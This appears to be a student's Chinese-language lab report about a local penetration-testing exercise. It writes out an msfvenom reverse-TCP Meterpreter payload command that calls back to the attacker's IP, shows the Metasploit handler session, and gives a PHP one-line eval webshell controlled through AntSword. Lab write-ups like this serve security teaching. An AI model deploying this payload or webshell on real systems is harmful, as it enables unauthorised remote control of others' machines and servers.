---
title: 网络安全作业：MSF木马生成免杀检测与Webshell控制实战
date: 2026-11-13 22:00:00
tags: 
  - 网络安全
  - 渗透测试
  - Metasploit
  - 蚁剑
  - 微步沙箱
categories: 
  - 课程作业
  - 实验报告
---

## 前言
本次作业主要包含两个核心部分：一是使用Metasploit框架生成Windows被控端木马，并提交至微步云沙箱进行检测分析；二是利用Web环境，植入一句话木马，并通过中国蚁剑（AntSword）获取目标网站的控制权。

**实验环境：**
*   **攻击机（主控端）**：Kali Linux (IP: `192.168.89.128`)
*   **靶机（被控端/Web服务器）**：Windows 11 物理机 (IP: `192.168.89.1`)
*   **网络环境**：手机热点（NAT模式）

---

## 一、 PPT9-10复现：生成被控端与微步沙箱检测

### 1.1 使用 Msfvenom 生成木马
首先在Kali终端中，使用 `msfvenom` 命令生成一个针对Windows系统的反向TCP连接木马（`.exe`格式）。由于写入`/root/`目录需要管理员权限，这里使用了 `sudo` 提权。

```bash
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.89.128 LPORT=5000 -f exe -o /root/payload.exe
```

![MSF-2026-11-14-14-26-10](https://cdn.jsdelivr.net/gh/ThatCryptoCod/blog-images@main/img/${mdFileName}/MSF-2026-11-14-14-26-10.png)

为了方便将文件传输到物理机进行沙箱检测，将木马复制到家目录，并利用Python快速开启一个HTTP服务供物理机下载。

```bash
sudo cp /root/payload.exe ~/
python3 -m http.server 8000
```

![MSF-2026-11-14-14-27-04](https://cdn.jsdelivr.net/gh/ThatCryptoCod/blog-images@main/img/${mdFileName}/MSF-2026-11-14-14-27-04.png)

在物理机浏览器中访问 `http://192.168.89.128:8000`，成功下载木马文件。

![MSF-2026-11-14-14-27-34](https://cdn.jsdelivr.net/gh/ThatCryptoCod/blog-images@main/img/${mdFileName}/MSF-2026-11-14-14-27-34.png)

### 1.2 提交微步云沙箱检测
将下载的 `payload.exe` 上传至微步在线云沙箱（`https://s.threatbook.com/`）进行分析。沙箱成功识别出该文件为恶意木马（Agent家族），验证了木马的有效性。

![MSF-2026-11-14-14-27-52](https://cdn.jsdelivr.net/gh/ThatCryptoCod/blog-images@main/img/${mdFileName}/MSF-2026-11-14-14-27-52.png)

---

## 二、 复现对被控端控制

返回Kali终端，启动 `msfconsole`，配置 `exploit/multi/handler` 模块监听本地5000端口。配置完成后，在物理机上双击运行刚才下载的 `payload.exe`（运行前已临时关闭Windows Defender）。

Kali成功接收到反弹连接，获得 `Meterpreter` 会话。执行 `sysinfo` 查看系统信息，执行 `show_mount` 查看磁盘，并执行 `screenshot` 截取目标屏幕，证明控制成功。

![MSF-2026-11-14-14-28-31](https://cdn.jsdelivr.net/gh/ThatCryptoCod/blog-images@main/img/${mdFileName}/MSF-2026-11-14-14-28-31.png)

---

## 三、 蚁剑连接控制目标网站

### 3.1 准备一句话木马并搭建环境
在本地物理机上使用 phpStudy（小皮面板）启动 Apache 服务。在网站根目录 `D:/phpstudy_pro/WWW/` 下创建一句话木马文件 `shell.php`，内容为：
`<?php @eval($_POST['pass']);?>`

### 3.2 利用蚁剑连接并控制
打开中国蚁剑（AntSword），右键添加数据，URL地址填写 `http://127.0.0.1/shell.php`，连接密码填写 `pass`。测试连接成功后，进入文件管理界面，成功读取到了靶机的目录结构。

![MSF-2026-11-14-14-29-29](https://cdn.jsdelivr.net/gh/ThatCryptoCod/blog-images@main/img/${mdFileName}/MSF-2026-11-14-14-29-29.png)
> *图注：蚁剑成功连接，获取 WWW 目录的文件列表*

为了进一步验证权限，右键打开虚拟终端。执行 `whoami` 命令，虽然因终端编码问题存在部分乱码，但上方的基础信息面板直接回显了当前路径（`D:/phpstudy_pro/WWW`）、系统信息（`Windows NT ...`）以及当前用户（`茹纬`），证明已完全控制该Web服务器。

![MSF-2026-11-14-14-42-48](https://cdn.jsdelivr.net/gh/ThatCryptoCod/blog-images@main/img/${mdFileName}/MSF-2026-11-14-14-42-48.png)
> *图注：通过虚拟终端执行 whoami，获取当前系统用户信息*

---

## 总结
本次实验完整复现了从木马生成、免杀/沙箱检测，到利用Web漏洞获取权限的完整渗透测试流程。通过实操，加深了对 Metasploit 框架和蚁剑工具的理解。

*（注：本次实验所有操作均在本地自建靶场环境中进行，仅供教学交流，请勿用于非法用途。）*